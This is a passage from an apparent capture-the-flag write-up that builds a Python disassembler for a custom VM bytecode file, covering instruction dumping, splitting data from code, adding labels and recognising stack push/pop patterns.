            <span class="n">case</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">reg1</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="n">reg2</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">MemStore</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">2</span>
            <span class="n">case</span> <span class="mi">5</span><span class="p">:</span>
                <span class="n">reg1</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="n">reg2</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">MemLoad</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">reg2</span><span class="p">,</span> <span class="n">reg1</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">2</span>
            <span class="n">case</span> <span class="mi">6</span><span class="p">:</span>
                <span class="n">reg1</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="n">reg2</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">RomLoad</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">reg2</span><span class="p">,</span> <span class="n">reg1</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">2</span>
            <span class="n">case</span> <span class="mi">7</span><span class="p">:</span>
                <span class="n">target</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">9</span><span class="p">])</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">Jump</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">target</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">9</span>
            <span class="n">case</span> <span class="mi">8</span><span class="p">:</span>
                <span class="n">reg</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">JumpReg</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">reg</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">case</span> <span class="mi">9</span><span class="p">:</span>
                <span class="n">reg1</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="n">reg2</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">target</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">2</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">10</span><span class="p">])</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">JumpEq</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">10</span>
            <span class="n">case</span> <span class="mi">10</span><span class="p">:</span>
                <span class="n">other</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">PrintReg</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">other</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">2</span>
            <span class="n">case</span> <span class="n">_</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Unknown instruction </span><span class="si">{</span><span class="n">opcode</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s"> @ 0x</span><span class="si">{</span><span class="n">offset</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
                <span class="k">break</span>

    <span class="k">return</span> <span class="n">instructions</span>
</code></pre></div></div>

<p>We also need something to now dump those instructions, while we could rely on python’s <code class="language-plaintext highlighter-rouge">repr</code> it’s not as intuitive to read (atleast for someone more familair with looking at typical (dis)assembler output)</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">opcode</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">opcode</span><span class="p">.</span><span class="n">addr</span><span class="p">:</span><span class="mi">04</span><span class="n">x</span><span class="si">}</span><span class="s"> '</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
        <span class="n">match</span> <span class="n">opcode</span><span class="p">:</span>
            <span class="n">case</span> <span class="n">Halt</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">halt'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">imm</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">mov r</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">, 0x</span><span class="si">{</span><span class="n">imm</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">MovReg</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">mov r</span><span class="si">{</span><span class="n">reg1</span><span class="si">}</span><span class="s">, r</span><span class="si">{</span><span class="n">reg2</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">Add</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span> <span class="o">|</span> <span class="n">Sub</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span> <span class="o">|</span> <span class="n">Mul</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span> <span class="o">|</span> <span class="n">Mod</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span> <span class="o">|</span> \
                 <span class="n">And</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span> <span class="o">|</span> <span class="n">Or</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span> <span class="o">|</span> <span class="n">Xor</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">)</span> <span class="o">|</span> <span class="n">Shr</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
                <span class="n">op_index</span> <span class="o">=</span> <span class="n">alu_ops</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">opcode</span><span class="p">))</span>
                <span class="n">alu_op</span> <span class="o">=</span> <span class="p">(</span><span class="s">'add'</span><span class="p">,</span><span class="s">'sub'</span><span class="p">,</span><span class="s">'mul'</span><span class="p">,</span><span class="s">'mod'</span><span class="p">,</span><span class="s">'and'</span><span class="p">,</span><span class="s">'or'</span><span class="p">,</span><span class="s">'xor'</span><span class="p">,</span> <span class="s">'shr'</span><span class="p">)[</span><span class="n">op_index</span><span class="p">]</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="si">{</span><span class="n">alu_op</span><span class="si">}</span><span class="s"> r</span><span class="si">{</span><span class="n">reg1</span><span class="si">}</span><span class="s">, r</span><span class="si">{</span><span class="n">reg2</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">MemStore</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">store mem[r</span><span class="si">{</span><span class="n">reg1</span><span class="si">}</span><span class="s">], r</span><span class="si">{</span><span class="n">reg2</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">MemLoad</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">mov r</span><span class="si">{</span><span class="n">reg1</span><span class="si">}</span><span class="s">, mem[r</span><span class="si">{</span><span class="n">reg2</span><span class="si">}</span><span class="s">]'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">RomLoad</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">mov r</span><span class="si">{</span><span class="n">reg1</span><span class="si">}</span><span class="s">, rom[r</span><span class="si">{</span><span class="n">reg2</span><span class="si">}</span><span class="s">]'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">Jump</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">jump 0x</span><span class="si">{</span><span class="n">target</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">print</span><span class="p">()</span>
            <span class="n">case</span> <span class="n">JumpReg</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">jump r</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">print</span><span class="p">()</span>
            <span class="n">case</span> <span class="n">JumpEq</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">jumpeq r</span><span class="si">{</span><span class="n">reg1</span><span class="si">}</span><span class="s">, r</span><span class="si">{</span><span class="n">reg2</span><span class="si">}</span><span class="s">, 0x</span><span class="si">{</span><span class="n">target</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">print</span><span class="p">()</span>
            <span class="n">case</span> <span class="n">PrintReg</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">printreg r</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">_</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Unknown instruction </span><span class="si">{</span><span class="n">opcode</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
                <span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>You’ll notice that I include extra lines after anything that jumps this is to make it more easy to see where the instruction pointer might not keep going.</p>

<p>Finally we have a main function</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="nb">buffer</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
    <span class="n">instructions</span>  <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
    <span class="n">dump</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>

<span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>Now if we run this what do we get</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ .\disassemble.py breach.bin &gt;output.asm
Unknown instruction e @ 0x2809
</code></pre></div></div>

<p>Damn, we couldn’t get through the whole file but we managed to get to 0x2809 which is a lot considering that for each instruction if it was over 10 for the opcode it would have failed, doing a quick pass over the file it looks like most of it looks like sensile bytecode you would expect to see, except for a few things:</p>

<ul>
  <li>The instructions at the end from <code class="language-plaintext highlighter-rouge">0x27f3</code> onwards don’t look right (maye this is the start of some data)</li>
  <li>The giant block of <code class="language-plaintext highlighter-rouge">printreg</code>’s seem pretty strange, we haven’t seen any output of these, maybe they happen when we get the right flag answer</li>
</ul>

<p>So for now let’s do some changes to just turn from <code class="language-plaintext highlighter-rouge">0x27f3</code> onwards into data bytes in the disassembly output, it could include bytecodes but it’s also a fairly known pattern for a VM (and non-VM) to have code at the start then data at the end of the file.</p>

<p>The other thing we can do is look at this a hexdump we might see a bit of a change in pattern between the instructions and the suspected data.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000027b0  03 0f 18 a1 a8 7f 00 00  00 00 00 00 02 20 11 5a  |............. .Z|
000027c0  2b 03 00 00 00 00 00 03  10 04 0a 01 08 00 00 00  |+...............|
000027d0  00 00 00 00 03 0a 02 3b  01 60 c0 00 00 00 00 00  |.......;.`......|
000027e0  00 03 0b 04 ba 05 1f 01  08 00 00 00 00 00 00 00  |................|
000027f0  03 0f 18 14 cc 67 65 47  61 6e 53 7f 70 63 65 47  |.....geGanS.pceG|
                ^^ 0x27f3 start
00002800  61 6e 31 36 02 61 65 47  61 6e 53 0c 29 63 65 47  |an16.aeGanS.)ceG|
00002810  61 6e 31 66 91 6a 65 47  61 6e 53 44 69 63 65 47  |an1f.jeGanSDiceG|
00002820  61 6e 67 12 c9 68 65 47  61 6e 53 36 02 61 65 47  |ang..heGanS6.aeG|
</code></pre></div></div>

<p>Looking at this, it seems like a fairly nice cut for data and instructions, in-fact if you search the disassembly output for <code class="language-plaintext highlighter-rouge">0x27f3</code> you’ll see things mentioning that same address.</p>

<p>So let’s go with a very naive implementation of dumping data from that address onwards.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dump_data</span><span class="p">(</span><span class="n">start_of_data</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">printable</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">,</span> <span class="s">'ascii'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">data_offset</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">start_of_data</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">data_offset</span><span class="p">:</span><span class="mi">04</span><span class="n">x</span><span class="si">}</span><span class="s"> '</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.db 0x</span><span class="si">{</span><span class="n">byte</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s"> ; </span><span class="si">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">.db 0x</span><span class="si">{</span><span class="n">byte</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="nb">buffer</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
    <span class="n">start_of_data</span> <span class="o">=</span> <span class="mh">0x27f3</span>
    <span class="n">instructions</span>  <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="nb">buffer</span><span class="p">[:</span><span class="n">start_of_data</span><span class="p">])</span>
    <span class="n">dump</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
    <span class="n">dump_data</span><span class="p">(</span><span class="n">start_of_data</span><span class="p">,</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">start_of_data</span><span class="p">:])</span>
</code></pre></div></div>

<p>Now let’s see how that output looks towards the end of the file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>27e5 	mov r1, mem[r15]
27e7 	mov r0, 0x8
27f0 	add r15, r0
27f2 	jump r1

27f3 	.db 0x14
27f4 	.db 0xcc
27f5 	.db 0x67 ; g
27f6 	.db 0x65 ; e
27f7 	.db 0x47 ; G
</code></pre></div></div>

<h3 id="adding-some-labels">Adding some labels</h3>
<p>Starting to look a lot nicer, we now have something fairly smooth to work with, let’s establish some labels to make things a little nicer to read.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_labels</span><span class="p">(</span><span class="n">instructions</span><span class="p">,</span> <span class="n">start_of_data</span><span class="p">,</span> <span class="n">end_of_data</span><span class="p">):</span>
    <span class="n">labels</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">opcode</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">:</span>
        <span class="n">match</span> <span class="n">opcode</span><span class="p">:</span>
            <span class="n">case</span> <span class="n">Jump</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">):</span>
                <span class="n">labels</span><span class="p">[</span><span class="n">target</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'LAB_</span><span class="si">{</span><span class="n">target</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span>
            <span class="n">case</span> <span class="n">JumpEq</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">):</span>
                <span class="n">labels</span><span class="p">[</span><span class="n">target</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'LAB_</span><span class="si">{</span><span class="n">target</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span>
            <span class="n">case</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">imm</span><span class="o">=</span><span class="n">imm</span><span class="p">)</span> <span class="k">if</span> <span class="n">imm</span> <span class="o">&gt;=</span> <span class="n">start_of_data</span> <span class="ow">and</span> <span class="n">imm</span> <span class="o">&lt;</span> <span class="n">end_of_data</span><span class="p">:</span>
                <span class="n">labels</span><span class="p">[</span><span class="n">imm</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'DAT_</span><span class="si">{</span><span class="n">imm</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span>
    <span class="k">return</span> <span class="n">labels</span>
</code></pre></div></div>

<p>Now we need to include them in our output</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">instructions</span><span class="p">,</span> <span class="n">labels</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">opcode</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">opcode</span><span class="p">.</span><span class="n">addr</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">opcode</span><span class="p">.</span><span class="n">addr</span><span class="p">]</span><span class="si">}</span><span class="s">:'</span><span class="p">)</span>
        <span class="c1">#print(f'{opcode.addr:04x} ', end='')
</span>        <span class="n">match</span> <span class="n">opcode</span><span class="p">:</span>
        <span class="p">...</span>
            <span class="n">case</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">imm</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">imm</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">mov r</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">imm</span><span class="p">]</span><span class="si">}</span><span class="s"> ; 0x</span><span class="si">{</span><span class="n">imm</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">mov r</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">, 0x</span><span class="si">{</span><span class="n">imm</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="p">...</span>
            <span class="n">case</span> <span class="n">Jump</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">jump </span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">target</span><span class="p">]</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">print</span><span class="p">()</span>
            <span class="p">...</span>
            <span class="n">case</span> <span class="n">JumpEq</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">jumpeq r</span><span class="si">{</span><span class="n">reg1</span><span class="si">}</span><span class="s">, r</span><span class="si">{</span><span class="n">reg2</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">target</span><span class="p">]</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">print</span><span class="p">()</span>
            <span class="p">...</span>
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dump_data</span><span class="p">(</span><span class="n">start_of_data</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">labels</span><span class="p">):</span>
    <span class="n">printable</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">,</span> <span class="s">'ascii'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">data_offset</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">start_of_data</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">data_offset</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">data_offset</span><span class="p">]</span><span class="si">}</span><span class="s">:'</span><span class="p">)</span>
        <span class="c1">#print(f'{data_offset:04x} ', end='')
</span>        <span class="p">...</span>
</code></pre></div></div>

<p>Now things are really starting to look nice to read and work with</p>
<pre><code class="language-asm">LAB_2054:
	mov r8, DAT_2c0f ; 0x2c0f
	mov r9, 0x2c18
	mov r0, 0x8
	sub r15, r0
	mov r0, LAB_2085 ; 0x2085
	store mem[r15], r0
	jump LAB_2463
</code></pre>

<p>Also doing a quick santiy check of all things within the data section to ensure there is no <code class="language-plaintext highlighter-rouge">LAB</code> or <code class="language-plaintext highlighter-rouge">FUNC</code> label’s meaning we have potential byte code inside where we’ve assumed it’s only data, we don’t so this is a good thing, it’s reinforcing the earlier assumption.</p>

<h3 id="finding-the-stack-pointer">Finding the stack pointer</h3>

<p>Now if your looking around the code enough you’ll start to spot a few patterns, the easy one to spot is what appears to be a stack happening with what register <code class="language-plaintext highlighter-rouge">r15</code> points to (starts at <code class="language-plaintext highlighter-rouge">0x10000</code> right at the start)</p>

<p>Doing a bit of a search of the disassembler output for <code class="language-plaintext highlighter-rouge">r15</code> appears to reiterate this with the common patterns being</p>

<table>
<tr>
<th style="text-align: right">Push immediate</th>
<th style="text-align: right">Push register</th>
<th>Pop</th>
</tr>
<tr>
<td>
<pre>
mov r0, 0x8
sub r15, r0
mov r0, 0x28
store mem[r15], r0
</pre>
</td>
<td>
<pre>
mov r0, 0x8
sub r15, r0
store mem[r15], r11
</pre>
</td>
<td>
<pre>
mov r1, mem[r15]
mov r0, 0x8
add r15, r0
</pre>
</td>
</tr>
</table>

<p>You might also notice that these also often get combined with a <code class="language-plaintext highlighter-rouge">jump</code> instruction we probably means they are a <code class="language-plaintext highlighter-rouge">call</code>/<code class="language-plaintext highlighter-rouge">ret</code> pair, let’s add some artifical instructions so we can remove this noise and make it easier to read, we’ll start with handling the <code class="language-plaintext highlighter-rouge">push</code> and <code class="language-plaintext highlighter-rouge">pop</code></p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Artifical instructions
</span><span class="n">PushImm</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'PushImm'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span> <span class="s">'imm'</span><span class="p">])</span>
<span class="n">PushReg</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'PushReg'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span> <span class="s">'reg'</span><span class="p">])</span>
<span class="n">Pop</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Pop'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span> <span class="s">'reg'</span><span class="p">])</span>
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">instructions</span><span class="p">,</span> <span class="n">labels</span><span class="p">):</span>
